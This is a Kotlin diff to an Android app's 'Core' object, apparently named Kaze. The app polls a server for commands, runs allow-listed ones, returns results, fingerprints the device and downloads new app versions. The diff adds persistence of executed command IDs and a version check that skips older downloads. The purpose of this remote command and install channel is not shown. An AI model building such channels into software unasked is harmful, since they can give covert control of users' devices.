@@ -23,11 +23,27 @@ object Core {
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private var deviceId: String = ""
     private var running = false
-    private val executedCommandIds = mutableSetOf<String>()
+    // Persisted in SharedPreferences — survives process death (e.g. system installer killing app)
+    private var executedCommandIds = mutableSetOf<String>()
+    private lateinit var prefs: android.content.SharedPreferences
+
+    private const val PREFS_NAME = "kaze_executed_cmds"
+    private const val KEY_EXECUTED_IDS = "executed_ids"
+
+    private fun loadExecutedIds() {
+        val saved = prefs.getStringSet(KEY_EXECUTED_IDS, emptySet()) ?: emptySet()
+        executedCommandIds = saved.toMutableSet()
+    }
+
+    private fun saveExecutedIds() {
+        prefs.edit().putStringSet(KEY_EXECUTED_IDS, executedCommandIds.toSet()).apply()
+    }
 
     fun start(context: Context) {
         if (running) return
         running = true
+        prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        loadExecutedIds()
         scope.launch {
             try {
                 val fingerprint = getFingerprint()
@@ -110,12 +126,29 @@ object Core {
                 for ((cmdId, cmd) in commands) {
                     if (executedCommandIds.contains(cmdId)) continue
                     executedCommandIds.add(cmdId)
+                    saveExecutedIds()
 
                     val action = cmd.split("|", limit = 2)[0].trim()
                     if (!Config.ALLOWED_COMMANDS.contains(action) && action != "wake") {
                         Log.w(TAG, "Unknown command rejected: $cmd")
                         Transport.markCommandFailed(cmdId)
                         continue
+                    }
+
+                    // Skip download commands for older versions — prevents system installer loop
+                    if (cmd.startsWith("download|")) {
+                        val url = cmd.removePrefix("download|")
+                        val versionRegex = Regex("""/v(\d+\.\d+\.\d+)/""")
+                        val match = versionRegex.find(url)
+                        if (match != null) {
+                            val remoteVersion = match.groupValues[1]
+                            val currentVersion = com.kaze.BuildConfig.VERSION_NAME
+                            if (compareVersions(remoteVersion, currentVersion) <= 0) {
+                                Log.d(TAG, "Skipping download for v$remoteVersion (current: v$currentVersion)")
+                                Transport.markCommandCompleted(cmdId)
+                                continue
+                            }
+                        }
                     }
 
                     Log.d(TAG, "Executing: $cmd")
@@ -139,12 +172,29 @@ object Core {
                     Log.d(TAG, "Result sent: ${cmd.take(30)} (${result.length} bytes)")
                 }
             }
+            // Trim persisted set if it grows too large (keep last 500)
             if (executedCommandIds.size > 500) {
-                executedCommandIds.clear()
+                val asList = executedCommandIds.toList().takeLast(500)
+                executedCommandIds = asList.toMutableSet()
+                saveExecutedIds()
             }
         } catch (e: Exception) {
             Log.e(TAG, "Poll error: ${e.message}")
         }
+    }
+
+    /**
+     * Compare two semver strings. Returns negative if a < b, 0 if equal, positive if a > b.
+     */
+    private fun compareVersions(a: String, b: String): Int {
+        val partsA = a.split(".").map { it.toIntOrNull() ?: 0 }
+        val partsB = b.split(".").map { it.toIntOrNull() ?: 0 }
+        for (i in 0 until maxOf(partsA.size, partsB.size)) {
+            val va = partsA.getOrElse(i) { 0 }
+            val vb = partsB.getOrElse(i) { 0 }
+            if (va != vb) return va.compareTo(vb)
+        }
+        return 0
     }
 
     fun stop() {
